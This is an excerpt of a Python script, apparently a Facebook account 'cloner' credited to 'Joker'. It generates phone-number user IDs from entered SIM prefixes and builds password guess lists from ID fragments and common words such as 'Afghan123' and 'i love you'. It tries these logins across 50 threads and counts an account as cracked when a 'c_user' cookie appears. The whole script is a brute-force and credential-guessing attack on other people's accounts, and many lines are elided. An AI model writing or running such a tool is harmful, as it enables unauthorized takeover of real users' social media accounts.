...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Joker")
...
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mHAQANI Joker  \033[38;5;46m                    ▊
...
def admin():
	...
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 > ')
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100049620943575&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='2':
...
def x():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			ps2 = uid[5:]
			ps3 = uid[4:]
			pwx = [uid,ps1,ps2,ps3,'Afghan123','Afghanistan','pubg1122','Afghan12345','khan123']
...
def virus2():
	...
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 9370, 9378, 𝟎700, 🤪")
	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 '
	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
	for nmbr in range(limit):
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Afghanistan','i love you','Afghan123']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ Joker ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
